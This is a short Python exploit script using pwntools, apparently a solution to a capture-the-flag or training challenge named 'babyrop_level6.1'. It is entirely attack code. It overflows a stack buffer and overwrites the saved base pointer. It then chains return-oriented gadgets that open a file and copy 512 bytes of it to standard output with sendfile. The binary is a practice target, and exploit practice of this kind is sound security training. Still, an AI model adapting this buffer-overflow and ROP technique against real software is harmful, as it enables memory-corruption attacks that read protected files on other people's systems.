from pwn import *

payload = b""
payload += b"A" * 80 # buffer
payload += b"B" * 8 # saved_rbp

payload += p64(0x401fd8) # pop rdi ; ret
payload += p64(0x403030) # -> '!' filename

payload += p64(0x401ff0) # pop rsi ; ret
payload += p64(0x0) # 0x0

payload += p64(0x401fad) # force_import() so that open() works

payload += p64(0x401fd8) # pop rdi ; ret
payload += p64(0x1) # outfd = stdout
payload += p64(0x401ff0) # pop rsi ; ret
payload += p64(0x3) # infd = 3
payload += p64(0x401fe8) # pop rdx ; ret
payload += p64(0x0) # offset* = 0
payload += p64(0x401fe0) # pop rcx ; ret
payload += p64(512) # size = 512 bytes

payload += p64(0x401fc4) # force_import() but from sendfile()

with open("input", "wb") as f:
    f.write(payload)

p = process("./babyrop_level6.1")

p.sendline(payload)

print(p.recvall())
